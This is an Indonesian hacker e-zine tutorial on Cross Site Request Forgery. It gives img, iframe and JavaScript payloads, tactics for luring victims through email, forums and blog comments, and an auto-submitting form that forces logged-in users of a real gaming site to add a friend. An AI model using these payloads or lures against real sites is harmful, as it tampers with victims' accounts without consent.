@@ -1,0 +1,195 @@
+             __                                            
+            /\ \                      __                   
+   __    ___\ \ \___     ___   ____  /\_\    ___      __   
+ /'__`\ /'___\ \  _ `\  / __`\/\_ ,`\\/\ \ /' _ `\  /'__`\ 
+/\  __//\ \__/\ \ \ \ \/\ \L\ \/_/  /_\ \ \/\ \/\ \/\  __/ 
+\ \____\ \____\\ \_\ \_\ \____/ /\____\\ \_\ \_\ \_\ \____\
+ \/____/\/____/ \/_/\/_/\/___/  \/____/ \/_/\/_/\/_/\/____/
+                                                           
+                                                           
+                    
+[ echo|zine, volume 6 issue 18 ]            
+                                 
+ 	CSRF: The introduction
+ Brought To You By : L41n aka 4r13 
+                     URL: http://4r13-is-a.lamer.la 
+                     lain/at/lifedork/com
+
+[ Pendahuluan ]
+
+	Cross Site Request Forgery adalah salah satu vulnerability pada 
+Web Application yang bekerja dengan cara mengeksploitasi suatu task dari 
+sebuah Web dengan memanfaatkan Autentikasi yang dimiliki oleh korban. 
+CSRF juga dikenal dengan sebutan "one link" attack , karena pada implementasinya, 
+sang attacker hanya butuh meng-inject-kan suatu link yang berisi suatu 
+web task URL pada halaman tertentu untuk dibuka oleh calon korban , 
+agar ketika si korban membuka halaman tersebut , secara otomatis si korban 
+akan mengeksekusi link URL yang telah di-inject-kan sang attacker sebelumnya. 
+Web Application yang vulnerable terhadap CSRF adalah Web Application yang 
+memiliki suatu URL Request (baik dengan menggunakan method GET maupun POST) 
+yang statis.
+
+contoh :  http://hackme.com/auth.php?logout=1 
+
+(URL diatas adalah salah satu contoh Web tasks yang memiliki URL untuk logout yang statis)
+
+[ Dasar Teori ]
+
+	Adalah salah besar jika anda menganggap CSRF merupakan suatu vulnerability 
+yang tidak berbahaya , atau sama dengan orang2 awam menganggap XSS sama sekali 
+tidak berbahaya. Well,itu semua salah besar :P . Berikut merupakan contoh2 penyerangan 
+yang dapat dilakukan dengan menggunakan vulnerability CSRF pada suatu Web Application :
+
+ - dapat digunakan untuk membuat si korban melakukan Posting pada suatu msg board 
+   yang vulnerable dengan XSS & CSRF dengan menggunakan autentikasi si korban.
+
+ - dapat melakukan perubahan account detail milik korban pada sebuah msg board 
+   atau web lainnya. Misal , mengganti secara paksa 'password' si korban :P .
+
+ - MySpace.com bahkan dulu sempat dibingungkan oleh 'Sammy Worm' yang memanfaatkan 
+   vulnerability CSRF dan XSS yang sempat ada di Myspace.com , yang menyebabkan 
+   seorang user secara otomatis akan meng-add friend seseorang yang bernama 'Sammy'.
+
+ - Denial Of Service Attack (DoS) pada sebuah Web Server. 
+ 
+ - dll etc dsb dst
+
+Cara yang paling banyak digunakan untuk melakukan penyerangan dengan 
+memanfaatan vulnerability CSRF , adalah dengan melakukan BBCODE / HTML / 
+JAVASCRIPT Image Tag Injection .
+
+ Contoh :
+
+ -BBCODE-
+ [img]http://hackme.com/auth.php?logout=1[/img]
+
+ -HTML- 
+ Menggunakan image tag:
+  <img src="http://hackme.com/auth.php?logout=1">
+ 
+ Menggunakan Script tag:
+  <iframe src="http://hackme.com/auth.php?logout=1">
+
+ -JAVASCRIPT-
+ <script>
+ var foo=new Image();
+ foo.src="http://hackme.com/auth.php?logout=1";
+ </script>
+
+ Untuk Refrensi CSRF DORKS lainnya , dapat dilihat di : http://csrf.0x000000.com
+
+Metode-metode yang pada umumnya digunakan oleh Attackers agar para korban 
+secara otomatis dapat mengeksekusi link yang dikehendaki oleh Attackers , 
+antara lain adalah :
+
+ 1. 'Melalui pengiriman email (HTML disabled)';
+ Membuat suatu page HTML berisi CSRF Injection diatas yang di host di Box milik 
+ Attacker (misal : http://attacker.com/openthis.html) . Kemudian sang attacker 
+ dapat mengirim email pada sang korban yang isinya mempersuasi korban untuk 
+ membuka url http://attacker.com/ openthis.html :P 
+
+ 2. 'Melalui pengiriman email (HTML enabled)';
+ Jika fitur HTML mail pada suatu mail provider adalah 'Enabled' , maka anda 
+ tidak perlu repot2 untuk mebuat page html anda sendiri. Langsung saja inject-kan 
+ salah satu HTML CSRF Injection diatas ;)
+
+ 3. 'Melalui Private msg di msg board (BBCODE enabled)'; 
+ Karena pada umumnya , fitur BBCODE pada suatu web msg board 'enabled' , 
+ maka ada kemungkinan juga bahwa pada pengiriman private messange ke user tertentu , 
+ fitur ini juga ter-'enabled'. Selanjutnya , tinggal inject kan saja 
+ CSRF BBCODE Injection seperti contoh diatas :P
+
+ 4. 'Melalui thread di msg baord (BBCODE enabled)';
+ Untuk mendapat korban yang lebih banyak , maka CSRF BBCODE Injection dapat 
+ juga langsung di inject kan ke thread suatu forum yang fitur BBCODE nya 'Enabled' :P 
+
+ 5. 'Melalui Guestbook' ;
+ Javascript/html CSRF Injection dapat pula di-inject kan pada suatu guestbook 
+ yang masih vulnerable terhadap XSS vulnerability.
+
+ 6. 'Comment di blog' :P ;
+ Berhubung Wordpress versi sebelum2nya memiliki banyak URL task yang statis , 
+ maka tidak ada salahnya jika kita sebarkan link page HTML kita yang berisi 
+ CSRF Injection pada Comment Section di Wordpress ;)
+
+ 7. : masih banyak cara lainnya untuk membuat korban mengeksekusi CSRF Injection Link 
+ anda , just be creative , try to combine CSRF and XSS ;)
+
+
+[ Proof Of Concept ]
+
+	Pada bagian ini , kita akan mencoba melakukan analisa CSRF vulnerability 
+pada salah satu web StarCraft Community (menggunakan POST method) , 
+http://sc.gosugamers.net . Dari analisa yang kita dapat , kita akan mencoba 
+membuat Page HTML yang berisi suatu auto-submit form, dimana ketika seorang 
+korban yang telah 'logged in' kemudian membuka Page HTML tersebut , 
+korban secara otomatis akan melakukan 'add friend' terhadap user 
+bernama 'websecurity.ro' . 
+
+Step by step :
+
+ 1. Daftarkan diri anda sebagai user di http://sc.gosugamers.net
+
+ 2. Setelah terdaftar sebagai user , kemudian lakukan log-in , dan pilihlah menu 
+    untuk melihat 'Friend list' sekaligus untuk melakukan 'Add friend/Add user to my friend list'  
+    yang anda miliki di: http://sc.gosugamers.net/friends
+ 
+ 3. Analisa Form 'Add user to my friend list' , dengan view HTML source pada browser anda , 
+    kemudian akan kita dapatkan HTML Form Action Source Code sebagai berikut :
+    
+    ------------------- html code -----------------------------
+    <form action="admin/friends.php" method="post">
+    <input name="sql" value="a_f" type="hidden" />
+    <input name="f_name" style="width: 150px" type="text" />
+    <input value="Add user to my friends list" type="submit" />
+    </form>
+    ------------------- html code -----------------------------
+
+ 4. Dari source code diatas , kemudian kita dapat membuat page auto-submit 
+    untuk 'Add user to my friend list' , sehingga ketika kita (dan siapapun yang telah 'logged in') 
+    membuka page HTML tersebut , secara otomatis kita akan meng-add friend 
+    user yang bernama 'websecurity.ro' ke Friend list kita. 
+
+    ------------------- html code -----------------------------
+    <form action="http://sc.gosugamers.net/admin/friends.php" method="post" name="dude">
+    <input name="sql" value="a_f" type="hidden" />
+    <input name="f_name" style="width: 150px" type="text" value="websecurity.ro" />
+    <input value="Add user to my friends list" type="submit" />
+    </form>
+    <script>
+    setTimeout("document.dude.submit()", 2000);
+    </script>
+    ------------------- html code -----------------------------
+
+ 5. Save file HTML tersebut ke local disk atau ke remote host manapun 
+    (misal nama file : openthis.html)
+
+ 6. Untuk membuktikannya , anda dapat langsung membuka file tersebut (ketika anda masih dalam keadaan 'logged in') , 
+    dan secara otomatis user 'websecurity.ro' telah ter-add sebagai 'Friend' anda.
+
+[ Penutup ]
+
+	Well, this is my 1st article on ECHO , hope you'll enjoy it ;)
+
+[ Referensi ]
+
+- http://csrf.0x000000.com/
+- http://zoiz.web.id
+- http://en.wikipedia.org/wiki/Csrf
+- http://www.cgisecurity.com/articles/csrf-faq.shtml
+- http://priyadi.net/archives/2007/03/09/lembur-memperbaiki-celah-keamanan-csrf/
+- http://websecurity.ro/blog/2007/11/17/csrf-cross-site-request-forgery-tutorial/
+- http://milw0rm.com
+- http://google.com
+
+
+[ Shoutz ]
+
+- ppl on DALnet : #newhack[dot]org #ITS #Singapore #e-c-h-o #batamhacker
+- forums : hackingforte.org , w4ck1ng.com , h4cky0u.org , forum.echo.or.id , forum.batamhacker.or.id
+- zoiz , bius , th0r , pushm0v , benny , reed_reed , mr[O]pt1c , billy the romanian white hat :P etc 
+
+*- $e18dot006dottxt - echo|zine - issue#18 - 280308 -*
+
+
+
